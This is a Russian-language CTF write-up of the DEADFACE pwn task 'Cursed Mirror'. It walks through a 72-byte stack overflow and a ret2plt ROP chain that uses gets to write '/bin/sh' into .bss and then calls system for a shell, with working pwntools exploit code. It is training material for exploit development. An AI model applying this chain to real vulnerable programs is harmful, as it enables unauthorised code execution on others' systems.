# Cursed Mirror — DEADFACE CTF (ret2plt: gets→system в bss)

Oct 18, 2026 · @Demian

## Условие

Pwn-таск DEADFACE. 64-битный ELF **без PIE**. Меню, пункт `2` («what do you seek?») читает строку в буфер с переполнением. В бинаре нет готовой `win`-функции, зато в PLT есть `system` и `gets` — значит строим цепочку сами.

## Поиск смещения

Смещение до адреса возврата ищем кор-дампом с `cyclic`-паттерном — вспомогательный скрипт [`find_offset.py`](./find_offset.py):

```python
io.sendlineafter(b'seek?:', cyclic(200))
io.wait()
core = io.corefile
log.info("offset = %d", cyclic_find(core.read(core.rsp, 8)))
```

Получаем **72 байта**.

## Идея эксплойта

В бинаре нет строки `/bin/sh`, поэтому её нужно сначала положить в память, а потом вызвать `system("/bin/sh")`. Подходящее перезаписываемое место — `.bss` (`0x406500`). План цепочки:

1. `pop rdi; ret` → `rdi = bss`
2. `gets(bss)` — читаем в `.bss` строку `/bin/sh` со stdin
3. снова `pop rdi; ret` → `rdi = bss`
4. `system(bss)` → shell

```python
pop_rdi    = 0x401da5
system_plt = elf.plt['system']   # 0x401080
gets_plt   = elf.plt['gets']     # 0x4010e0
bss        = 0x406500

chain  = b'A'*72
chain += p64(pop_rdi) + p64(bss)   # rdi = bss
chain += p64(gets_plt)             # gets(bss)
chain += p64(pop_rdi) + p64(bss)   # rdi = bss
chain += p64(system_plt)           # system(bss)
```

## Тонкость с getchar

После отправки цепочки программа ещё делает `getchar()` (где-то в коде по смещению +145), который «съедает» один байт. Поэтому строку для `gets` шлём с ведущим `A`: он гасит `getchar`, а в `.bss` попадает именно `/bin/sh`:

```python
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'seek?:', chain)
io.sendline(b'A/bin/sh')   # 'A' гасит getchar; gets пишет /bin/sh в bss
io.interactive()
```

## Эксплойт

Полная версия — [`exploit.py`](./exploit.py). После срабатывания `system("/bin/sh")` получаем шелл и читаем флаг `deadface{...}`.

## Итог

Нет PIE + есть `system`/`gets` в PLT = ret2plt без утечек libc: сами «доставляем» `/bin/sh` в `.bss` через `gets`, затем зовём `system`. Главные детали — корректное смещение (через core-dump) и лишний `getchar`, который нужно учесть во вводе.
